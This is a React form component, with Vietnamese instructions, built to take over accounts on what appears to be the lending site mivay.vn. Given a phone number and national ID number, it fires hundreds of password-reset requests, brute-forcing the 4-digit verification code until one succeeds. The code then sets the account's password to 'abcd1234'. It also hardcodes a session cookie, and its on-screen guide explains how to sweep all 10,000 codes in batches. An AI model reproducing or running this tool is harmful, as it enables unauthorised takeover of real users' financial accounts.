import React, { useState } from 'react'
import { Formik } from 'formik';
import * as Yup from 'yup';


const MiVay = () => {
    const [status, setstatus] = useState('Chưa bắt đầu')

    return (
        <Formik
            initialValues={{ sdt: '', cmnd: '', start: '' }}
            validationSchema={Yup.object({
                sdt: Yup.string()
                    .max(11, '')
                    .required('Phải nhập'),
                cmnd: Yup.string()
                    .max(12, 'Phải nhập')
                    .required('Phải nhập'),
                start: Yup.number()
                    .max(9999, 'Phải nhập')

                    .required('Phải nhập'),
            })}
            onSubmit={(values, { setSubmitting }) => {
                setstatus("Đang xử lý...")
                //   alert(JSON.stringify(values, null, 2));
                const phone = values.sdt
                const cmnd = values.cmnd
                const start = values.start
                setSubmitting(false);
                // if(start>10000 || start<0) alert('Số bắt đầu không hợp lệ!')
                // else
                if (start === 0) {
                   
                    for (let i = 0; i <= 9; i++) {
                        for (let j = 0; j <= 9; j++) {
                            for (let k = 0; k <= 9; k++) {

                               let  number = i * 100 + j * 10 + k
                                if (number < 10) number = "000" + number
                                else if (number < 100) number = "00" + number
                                else if (number < 1000) number = "0" + number
                                fetch('https://mivay.vn/smart-loan/modify/password', {
                                    method: 'POST',
                                    headers: {
                                        'Accept': 'application/json',
                                        'Accept-Encoding': 'gzip, deflate, br',
                                        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
                                        'accessToken': 'undefined',
                                        'Connection': 'keep-alive',
                                        'Content-Type': 'application/json;charset=UTF-8',
                                        'Host': 'mivay.vn',

                                        'Referer': 'https://mivay.vn/home/password?phone=0905321456',
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
                                        'Cookie': 'JSESSIONID=chlnrlA4qDFxVI_jqasvNqVAIxKxrCWN9U7MRQxw',
                                    },
                                    body: JSON.stringify({
                                        "phone": phone,
                                        "password": "abcd1234",
                                        "comfirmPassword": "abcd1234",
                                        "validateCode": number,
                                        "isValidateCode": "Y",
                                        "idcard": cmnd,
                                        "maskedIdcard": cmnd
                                    })
                                }).then(res => res.json())
                                    .then(json => {
                                        console.log(json.status.msg)
                                        setstatus("Đang lọc...")
                                        setstatus("...Đang lọc...")
                                        setstatus("Kết quả:"+ json.status.msg)
                                        if (json.status.msg === 'Thực hiện thành công') {
                                            alert('Mật khẩu đã được đổi thành abcd1234');
                                            setstatus('Đã xong')
                                            return;
                                        }
                                       
                                    })





                            }

                        }

                    }
                }
                else
                    for (let index = start; index <= values.start + 1000; index++) {
                        fetch('https://mivay.vn/smart-loan/modify/password', {
                            method: 'POST',
                            headers: {
                                'Accept': 'application/json',
                                'Accept-Encoding': 'gzip, deflate, br',
                                'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
                                'accessToken': 'undefined',
                                'Connection': 'keep-alive',
                                'Content-Type': 'application/json;charset=UTF-8',
                                'Host': 'mivay.vn',

                                'Referer': 'https://mivay.vn/home/password?phone=0905321456',
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
                                'Cookie': 'JSESSIONID=chlnrlA4qDFxVI_jqasvNqVAIxKxrCWN9U7MRQxw',
                            },
                            body: JSON.stringify({
                                "phone": phone,
                                "password": "abcd1234",
                                "comfirmPassword": "abcd1234",
                                "validateCode": index,
                                "isValidateCode": "Y",
                                "idcard": cmnd,
                                "maskedIdcard": cmnd
                            })
                        }).then(res => res.json())
                            .then(json => {
                                console.log(json.status.msg)
                                setstatus('Đã số lọc:'+ index+" Kết quả:"+ json.status.msg)
                                if (json.status.msg === 'Thực hiện thành công') {
                                    alert('Mật khẩu đã được đổi thành abcd1234');
                                    setstatus('Đã xong')
                                    return;
                                }
                                // if (json.status.msg === 'Số CMND không chính xác') {
                                //     alert('Số CMND không chính xác');
                                //     return;
                                // }
                                // if (json.status.msg === 'Người dùng chưa đăng ký') {
                                //     alert('Người dùng chưa đăng ký');
                                //     return;
                                // }



                            })

                    }

            }}
        >
            {formik => (

                <form onSubmit={formik.handleSubmit}>
                    <div className="container">
                        <h1>MiVay.com</h1>
                        <div>
                            Hướng dẫn: <br></br>
                            1. Phải nhập cả 3 ô nhập liệu, tất cả đều là số: <br></br>
                            2. Chỉ lọc được 1000 số/ lần: <br></br>
                            3. Ở ô số bắt đầu, mỗi lần nhập 1  trong các số sau: 0, 1000.2000,3000,4000,5000,6000,7000,8000,9000 <br></br>
                            4. Khi thành công, mật khẩu là abcd1234 <br/>
                            5.Nếu trạng thái phần mềm là "ố CMND không chính xác " hoặc 'Người dùng chưa đăng ký'. Vui lòng làm mới (F5) trang và nhập đúng.
                            

                        </div><br/>
                        <h3>Trạng thái phần mềm:  {status}</h3>
                        <label htmlFor="sdt">Số điện thoại:</label><br />
                        <input
                            id="sdt"
                            type="text"
                            {...formik.getFieldProps('sdt')}
                        />
                        {formik.touched.sdt && formik.errors.sdt ? (
                            <div>{formik.errors.sdt}</div>
                        ) : null}
                        <br />
                        <label htmlFor="cmnd">CMND/CCCD:</label><br />
                        <input
                            id="cmnd"
                            type="text"
                            {...formik.getFieldProps('cmnd')}
                        />
                        {formik.touched.cmnd && formik.errors.cmnd ? (
                            <div>{formik.errors.cmnd}</div>
                        ) : null}
                        <br />
                        <label htmlFor="start">Số bắt đầu:</label><br />
                        <input
                            id="start"
                            type="number"
                            {...formik.getFieldProps('start')}
                        />
                        {formik.touched.start && formik.errors.start ? (
                            <div>{formik.errors.cmnd}</div>
                        ) : null}


                        <br />
                        <div className="col-12" style={{ height: '20px' }}></div>
                        <button className=" btn btn-primary" type="submit">Check MiVay</button>
                            
                    </div>
                  
                </form>
            )}
        </Formik>
    );
};


export default MiVay
